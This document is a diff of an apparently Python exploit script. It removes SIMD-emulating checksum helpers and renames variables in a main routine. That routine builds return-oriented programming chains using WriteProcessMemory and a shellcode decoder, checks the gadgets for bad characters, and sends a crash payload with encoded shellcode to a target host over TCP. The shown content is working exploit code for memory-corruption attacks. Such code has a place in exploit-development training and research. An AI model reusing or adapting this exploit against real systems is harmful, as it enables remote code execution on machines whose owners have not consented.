@@ -294,91 +294,6 @@ class Helpers:
 
         return (a << sizeof_b) | b
 
-    def extract_and_accumulate_128bit_chunks(buffer,debug=False):
-        """
-        Simulates SIMD-like accumulation of 128-bit data chunks in an alternating pattern.
-        Used in SSE or AVX code when processing data in parallel registers (xmm).
-        """
-        def add_128bit_lanes(a: int, b: int) -> int:
-            # Convert to 16-byte little-endian
-            a_bytes = a.to_bytes(16, 'little')
-            b_bytes = b.to_bytes(16, 'little')
-            result = bytearray()
-            for i in range(0, 16, 4):
-                lane_a = int.from_bytes(a_bytes[i:i+4], 'little')
-                lane_b = int.from_bytes(b_bytes[i:i+4], 'little')
-                lane_sum = (lane_a + lane_b) & 0xFFFFFFFF
-                result += lane_sum.to_bytes(4, 'little')
-            return int.from_bytes(result, 'little')
-
-        startbit = 0x8
-        chunk_size = 0x10
-        num_chunks = (len(buffer) - startbit) // chunk_size
-
-        chunks = []
-        for i in range(num_chunks):
-            offset = startbit + i * chunk_size
-            part1 = int.from_bytes(buffer[offset:offset + startbit], 'little')
-            part2 = int.from_bytes(buffer[offset + startbit:offset + chunk_size], 'little')
-            full = (part2 << 64) | part1
-            chunks.append(full)
-
-        xmm2 = 0
-        xmm1 = 0
-
-        if debug:
-            print("=== Iteration Log ===")
-        for i, chunk in enumerate(chunks):
-            if i % 2 == 0:
-                xmm2 = add_128bit_lanes(xmm2, chunk)
-            else:
-                xmm1 = add_128bit_lanes(xmm1, chunk)
-
-            if debug:
-                print(f"XMM2: {xmm2.to_bytes(16, 'little')[::-1].hex()}")
-                print(f"XMM1: {xmm1.to_bytes(16, 'little')[::-1].hex()}")
-
-        print(f"Last XMM2: {xmm2.to_bytes(16, 'little')[::-1].hex()}")
-        print(f"Last XMM1: {xmm1.to_bytes(16, 'little')[::-1].hex()}")
-        return xmm2, xmm1
-
-    def calculate_checksum(xmm1: int, xmm2: int) -> int:
-        """
-        Simulates a series of SIMD (Single Instruction, Multiple Data) operations used in SSE instructions. 
-        It processes two 128-bit integers (xmm1 and xmm2) and returns a 32-bit checksum value.
-        """
-        def paddd(a: int, b: int) -> int:
-            # 32-bit lane-wise addition
-            a_bytes = a.to_bytes(16, 'little')
-            b_bytes = b.to_bytes(16, 'little')
-            result = bytearray()
-            for i in range(0, 16, 4):
-                lane_a = int.from_bytes(a_bytes[i:i+4], 'little')
-                lane_b = int.from_bytes(b_bytes[i:i+4], 'little')
-                lane_sum = (lane_a + lane_b) & 0xFFFFFFFF
-                result += lane_sum.to_bytes(4, 'little')
-            return int.from_bytes(result, 'little')
-
-        def psrldq(val: int, byte_shift: int) -> int:
-            # Logical right shift by N bytes
-            val_bytes = val.to_bytes(16, 'little')
-            shifted = val_bytes[byte_shift:] + b'\x00' * byte_shift
-            return int.from_bytes(shifted, 'little')
-
-        # Perform the sequence
-        xmm1 = paddd(xmm1, xmm2)           # xmm1 += xmm2
-        xmm0 = xmm1                        # xmm0 = xmm1
-        xmm0 = psrldq(xmm0, 8)             # shift right by 8 bytes
-        xmm1 = paddd(xmm1, xmm0)           # xmm1 += shifted xmm0
-        xmm0 = xmm1
-        xmm0 = psrldq(xmm0, 4)             # shift right by 4 bytes
-        xmm1 = paddd(xmm1, xmm0)           # final add
-
-        # Extract lowest 32 bits and XOR with static value in code
-        checksum = (xmm1 & 0xffffffff) ^ 0x592AF351
-
-        return checksum
-
     def keyboard_interrupt():
         """Handles keyboardinterrupt exceptions"""""
         print("\n\n[*] User requested an interrupt, exiting...")
@@ -1971,10 +1886,10 @@ def main(argv):
         ropskelalign = (offsetropskel + lenropblock + Shellcode.mappedbadscchars[-1])               # Offset to ropskel function, calculated on last shellcode badbyte occurence
         
         # Update ROP chains
-        ropskelfunc_gadgets = ROP.wpmSkeleton(offsetscretaddr,offsetwritable)
-        ropskelfunc = b''.join(pack('<L',_) for _ in ropskelfunc_gadgets)
-        ropchainwpm_gadgets = ROP.chainWriteProcessMemory(intbaselib_libdll,payloadoffsetsc,ropdecoderoffseteax)
-        ropchainwpm = b''.join(pack('<L',_) for _ in ropchainwpm_gadgets)
+        ropskel_gadgets = ROP.wpmSkeleton(offsetscretaddr,offsetwritable)
+        ropskel = b''.join(pack('<L',_) for _ in ropskel_gadgets)
+        ropchain_gadgets = ROP.chainWriteProcessMemory(intbaselib_libdll,payloadoffsetsc,ropdecoderoffseteax)
+        ropchain = b''.join(pack('<L',_) for _ in ropchain_gadgets)
         ropchainscdecoder_gadgets = ROP.chainscDecoder(intbaselib_libdll,encodedsc,offsetDecoding)
         ropchainscdecoder = b''.join(pack('<L',_) for _ in ropchainscdecoder_gadgets)
         ropchainskelalign_gadgets = ROP.chainropskelAlign(intbaselib_libdll,ropskelalign)
@@ -1983,8 +1898,8 @@ def main(argv):
         ### ROP CHECK FOR BADCHARS ###
         # Add all gadgets to chain to check for badchars
         check_badchar_ropchains = [
-            ropskelfunc_gadgets,
-            ropchainwpm_gadgets,
+            ropskel_gadgets,
+            ropchain_gadgets,
             ropchainscdecoder_gadgets,
             ropchainskelalign_gadgets,
         ]   
@@ -2010,7 +1925,7 @@ def main(argv):
         # Create socket
         sock = Network.TCP.creategsocktcp(host,port)
         # Send data
-        paylCrash = Payload.poc_crash(intbaselib_libdll,ropskelfunc,ropchainwpm,ropchainscdecoder,ropchainskelalign,encodedsc)
+        paylCrash = Payload.poc_crash(intbaselib_libdll,ropskel,ropchain,ropchainscdecoder,ropchainskelalign,encodedsc)
         # Send EIP/CRASH
         Network.TCP.sendrecvsocktcp(paylCrash)
         # Close socket
